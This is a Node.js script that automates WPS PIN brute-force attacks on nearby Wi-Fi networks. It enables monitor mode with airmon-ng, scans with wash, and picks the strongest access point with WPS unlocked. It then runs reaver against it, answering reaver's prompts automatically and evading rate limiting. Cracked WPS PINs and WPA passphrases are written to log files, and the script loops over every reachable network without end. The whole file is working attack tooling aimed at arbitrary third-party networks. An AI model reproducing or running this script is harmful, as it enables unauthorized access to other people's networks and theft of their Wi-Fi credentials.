
const { spawn } = require('child_process');
const fs = require('fs');


let Conf = {

    data: {
        'is-loaded': false, // flag is synced with conf.json file

        'wash-scan-time': 120, // seconds
        'bssid-except-list': [], // ['xx:xx..', 'yy:yy:..']  - found points or just except this points
        'bssid-wait-list': [], // [{'bssid': 'xx:xx:..', 'addedTime': time}, {..}]
        'bssid-wait-time': 10  // min
    },

    filePath: 'conf.json',

    load: async () => {
        try {
            let data = await Storage.read(Conf.filePath);
            data = JSON.parse(data);

            if (typeof data['is-loaded'] !== 'undefined') {
                Conf.data = data;
                Conf.data['is-loaded'] = true;
            } else {
                await Conf.write(Conf.data);
                Conf.data['is-loaded'] = true;
            }

        } catch(e) {
            await Conf.write(Conf.data);
            Conf.data['is-loaded'] = true;
        }
        return Conf.data;
    },

    write: async (data) => {
        await Storage.write(Conf.filePath, data);
    },

    rebuildWaitList: async () => {

        // recalculate bssid-wait-list
        let timestamp = Math.floor(new Date().getTime() / 1000);
        let waitList = [];
        for (let i in Conf.data['bssid-wait-list']) {
            if (Conf.data['bssid-wait-list'].hasOwnProperty(i)) {
                let waitBssid = Conf.data['bssid-wait-list'][i];
                if ( (timestamp - waitBssid['addedTime'])/60 < Conf.data['bssid-wait-time']) {
                    waitList.push(waitBssid);
                }
            }
        }
        Conf.data['bssid-wait-list'] = waitList;
    },

    addWaitBssid: async (bssid) => {

        let timestamp = Math.floor(new Date().getTime() / 1000);

        let exist = false;
        for (let i in Conf.data['bssid-wait-list']) {
            if (Conf.data['bssid-wait-list'].hasOwnProperty(i)) {
                let waitBssid = Conf.data['bssid-wait-list'][i];
                if (waitBssid['bssid'] === bssid) {
                    exist = true;
                    Conf.data['bssid-wait-list'][i]['addedTime'] = timestamp;
                }
            }
        }

        if (!exist) {
            Conf.data['bssid-wait-list'].push({
                'bssid': bssid,
                'addedTime': timestamp
            });
        }
    },

    isWaitBssid: (bssid) => {
        let exist = false;
        let timestamp = Math.floor(new Date().getTime() / 1000);

        for (let i in Conf.data['bssid-wait-list']) {
            if (Conf.data['bssid-wait-list'].hasOwnProperty(i)) {
                let waitBssid = Conf.data['bssid-wait-list'][i];
                if (waitBssid['bssid'] === bssid
                    && (timestamp - waitBssid['addedTime'])/60 < Conf.data['bssid-wait-time']
                ) {
                    exist = true;
                }
            }
        }
        return exist;
    }
};

let Storage = {

    read: async (file) => {
        return new Promise((res, rej) => {
            try {
                fs.readFile(file, "utf8", (err, data) => { res(data); });
            } catch(e) {}
        });
    },

    write: async (file, data) => {
        return new Promise((res, rej) => {
            fs.writeFile(file, JSON.stringify(data), "utf8", (inf) => {
                res();
            });
        });
    },

    log: async (file, line) => {
        return new Promise((res, rej) => {
            fs.appendFile('./logs/'+ file, line+"\n", err => {
                if (err) { rej() }
                res();
            });
        });
    }
};

/**
 * check and init monitor mode
 * @constructor
 */
let InitMonitorMode = async function(){

    // check if monitor mode is enabled
    let isMonitorModeEnabled = async function(){

        return new Promise(function(res, rej){

            let ifconfig = spawn('ifconfig', ['wlan0mon']);

            let parseResult = function(data){
                data = data.toString();
                let notFound1 = data.indexOf('Device not found');
                let notFound2 = data.indexOf('does not exist');

                if (notFound1 >= 0 || notFound2 >= 0) {
                    return false;
                } else {
                    return true;
                }
            };

            ifconfig.stdout.on('data', data => { res(parseResult(data)); });
            ifconfig.stderr.on('data', data => { res(parseResult(data)); });
        });
    };

    // enable monitor mode
    let enableMonitorMode = async function(){
        return new Promise(function(res, rej){
            let airmonStart = spawn('airmon-ng', ['start', 'wlan0']);
            airmonStart.on('close', code => {
                res(code);
            });
            airmonStart.on('error', err => {
                rej(err);
            });
        });
    };

    // check kill
    let checkKill = async function(){
        return new Promise(function(res, rej){
            let airmonKill = spawn('airmon-ng', ['check', 'kill']);
            airmonKill.on('close', code => {
                if (code == 0) {
                    res(true);
                } else {
                    rej(code);
                }
                res(true);
            });
        });
    };

    let _isMonitorModeEnabled = await isMonitorModeEnabled();

    if (!_isMonitorModeEnabled) {

        // enable monitor mode
        await enableMonitorMode();

        _isMonitorModeEnabled = await isMonitorModeEnabled();

        if (_isMonitorModeEnabled) {
            await checkKill();
            return Promise.resolve(true);
        } else {
            return Promise.resolve(false);
        }
    } else {
        await checkKill();
        return Promise.resolve(true);
    }

};

/**
 *
 * @returns {{getNextPoint: getNextPoint}}
 * @constructor
 */
let Wash = async function(){

    let getNextPoint = async () => {
        let _list = await getPointsList(true);

        // exclude
        let list = [];
        for (let i in _list) {
            if (_list.hasOwnProperty(i)
                && !Conf.isWaitBssid(_list[i]['bssid'])
            ) {
                list.push(_list[i]);
            }
        }

        let point = null;

        // sort by signal power
        if (list.length > 0) {
            list = list.sort(function(a, b){ return a['dbm'] < b['dbm']; });
            point = list[0];
        }

        return Promise.resolve(point);
    };

    /**
     * get points
     * @returns {Promise<any>}
     */
    let getPointsList = async () => {
        let list = [];

        // parse wash output
        let parseStdOut = (data, isJson = false) => {
            let json = [];
            data = data.toString();

            if (isJson) {
                // parse json output
                json = [JSON.parse(data.trim())];
            } else {
                // parse wash text output
                let lines = data.split("\n");

                for (let i in lines) {
                    if (lines.hasOwnProperty(i)) {
                        let line = lines[i];
                        let _parts = line.split(' ');

                        // delete empty parts
                        let parts = [];
                        for (let j in _parts) {
                            if (_parts.hasOwnProperty(j) && _parts[j].trim() !== '') {
                                parts.push(_parts[j].trim());
                            }
                        }

                        if (parts.length === 7 && parts[0] !== 'BSSID') {
                            json.push({
                                'bssid': parts[0],
                                'channel': parseInt(parts[1]),
                                'dbm': parseInt(parts[2]),
                                'wps': parts[3],
                                'lock': parts[4].toLowerCase() === 'yes',
                                'vendor': parts[5],
                                'essid': parts[6]
                            });
                        }
                    }
                }
            }

            return json;
        };

        //let wash = spawn('wash', ['-i', 'wlan0mon', '-j']);
        let wash = spawn('wash', ['-i', 'wlan0mon']);
        wash.stdout.on('data', data => {

            //Storage.log('wash', data.toString());

            let jsonList = parseStdOut(data);

            // // 1 - locked, 2 - unlocked
            // if (onlyWpsUnlocked && json.wps_locked === 1) { return; }

            if (jsonList.length > 0) {
                let exist = false;

                for (let i in jsonList) {
                    if (jsonList.hasOwnProperty(i)) {
                        let parsedPoint = jsonList[i];

                        // skip locked points
                        if (parsedPoint.lock) { continue; }

                        // skip exception points
                        let skip = false;
                        for (let k in Conf.data['bssid-except-list']) {
                            if (Conf.data['bssid-except-list'].hasOwnProperty(k)) {
                                let exceptBssid = Conf.data['bssid-except-list'][k];
                                if (exceptBssid === parsedPoint.bssid) {
                                    skip = true;
                                    break;
                                }
                            }
                        }
                        if (skip) { continue; }

                        // check if already exist in list
                        for (let j in list) {
                            if (list.hasOwnProperty(j)) {
                                let existPoint = list[j];

                                if (parsedPoint.bssid === existPoint.bssid) {
                                    exist = true;
                                }
                            }
                        }

                        // add point to list
                        if (!exist) {
                            list.push(parsedPoint);
                        }
                    }
                }
            }
        });

        return new Promise((res, rej) => {
            setTimeout(() => {
                // kill wash process
                wash.stdin.pause();
                wash.kill();

                res(list);
            }, Conf.data['wash-scan-time'] * 1000);
        });
    };

    return {
        'getNextPoint': getNextPoint
    };
};


let Reaver = async function(point){

    // run reaver
    let reaver = spawn('reaver', ['-i', 'wlan0mon', '-vv', '-b', point.bssid, '-c', point.channel]);
    //let reaver = spawn('reaver', ['-i', 'wlan0mon', '-vv', '-b', '70:4F:57:FC:13:F4', '-c', '1']);

    let killZombieTimeout = 120; // seconds
    let lastUpdated = Math.floor(new Date().getTime() / 1000);

    return new Promise((res, rej) => {

        let timeoutOccured = 0;
        let retryingPinCounter = 0;
        let lastWarning = '';

        // check for kill zombie processes
        let zKillInterval = setInterval(() => {
            let timestamp = Math.floor(new Date().getTime() / 1000);

            // kill zombie reaver process
            if (timestamp - lastUpdated > killZombieTimeout) {
                close();
            }
        }, 1000);

        // [!] handle reaver stdout warnings
        let _processReaverWarning = (line) => {

            console.log(line);

            line = line.toLowerCase();

            // AP rate limiting detected
            if (line.indexOf('detected ap rate limiting') >= 0) {
                close();

            // Receive timeout occurred
            } else if (line.indexOf('timeout occurred') >= 0) {
                timeoutOccured++;

                if (timeoutOccured >= 5) {
                    Conf.addWaitBssid(point['bssid']);
                    close();
                }
            } else if (line.indexOf('re-trying last pin') >= 0) {

                if (lastWarning.indexOf('re-trying last pin') >= 0) {
                    retryingPinCounter++;
                }

                if (retryingPinCounter > 5) {
                    Conf.addWaitBssid(point['bssid']);
                    close();
                }
            }

            // last warning timestamp
            if (line !== lastWarning) { lastUpdated = Math.floor(new Date().getTime() / 1000); }

            lastWarning = line;
        };

        // [+] handle reaver stdout msg
        let _processReaverMessage = (line) => {
            let _line = line.toLowerCase();

            // log complete persentage
            if (_line.indexOf(' complete ') > 0) {
                Storage.log(point['essid'], line);

            // pin found
            } else if (_line.indexOf('wps pin') > 0
                || _line.indexOf('wpa psk') > 0
                || _line.indexOf('ap ssid') > 0
            ) {
                Storage.log(point['essid'], line);
                Conf.data['bssid-except-list'].push(point.bssid);
                close();
            }

        };

        // [?] handle reaver stdout questions
        let _processReaverQuestion = (line) => {
            // log all questions
            //Storage.log(point['essid'], line);

            reaver.stdin.write('Y');
        };

        // [-] handle reaver stdout fails
        let _processReaverFail = (line) => {
            let _line = line.toLowerCase();

            if (_line.indexOf('failed to recover wpa') > 0) {
                Storage.log(point['essid'], line);
                Conf.data['bssid-except-list'].push(point.bssid);
                close();
            }
        };

        // handle reaver stdout
        let _processOutput = data => {
            data = data.toString();

            // debug output
            //Storage.log('reaver', data);
            //console.log(data);

            let _lines = data.split("\n");

            let lines = [];
            for (let i in _lines) {
                if (_lines.hasOwnProperty(i)) {
                    let line = _lines[i].trim();

                    // skip empty lines
                    if (line === '') { continue; }

                    // detect reaver stdout/stderr msg type
                    let msgFlag = line.substr(0, 3);
                    if (msgFlag === '[?]') {        // question (e.g. "restore prev session")
                        _processReaverQuestion(line);
                    } else if (msgFlag === '[!]') { // warning
                        _processReaverWarning(line);
                    } else if (msgFlag === '[+]') { // message
                        _processReaverMessage(line);
                    } else if (msgFlag === '[-]') { // fails
                        _processReaverFail(line);
                    }
                }
            }
        };

        // close reaver and exit
        let close = () => {
            clearInterval(zKillInterval);
            reaver.stdin.pause();
            reaver.kill();
            res();
        };

        reaver.stdout.on('data', data => { _processOutput(data); });

        reaver.stderr.on('data', data => { _processOutput(data); });

        reaver.on('error', err => {
            console.log('ERROR', err);
        });

        reaver.on('close', code => {
            reaver.stdin.end();
            res(code);
        });
    });
};

// sleep
let sleep = async (seconds) => { return new Promise((res, rej) => { setTimeout(function(){ res(); }, seconds * 1000); }); };

// run
(async function(){

    // load config
    await Conf.load();

    console.log(Conf.data);

    let isEnabled = await InitMonitorMode();

    if (!isEnabled) {
        throw new Error('Can\'t enable monitor mode');
    }

    while (true) {
        let wash = await Wash();

        await Conf.rebuildWaitList();
        let newPoint = await wash.getNextPoint();

        if (newPoint) {
            console.log('scan: ', newPoint.essid);

            // bruteforce point
            let reaver = await Reaver(newPoint);
        } else {
            let waitTime = 300;
            console.log('no points to scan - wait '+ waitTime +' seconds');
            await sleep(waitTime);
        }

        // flush config
        Conf.write(Conf.data);
    }
})();
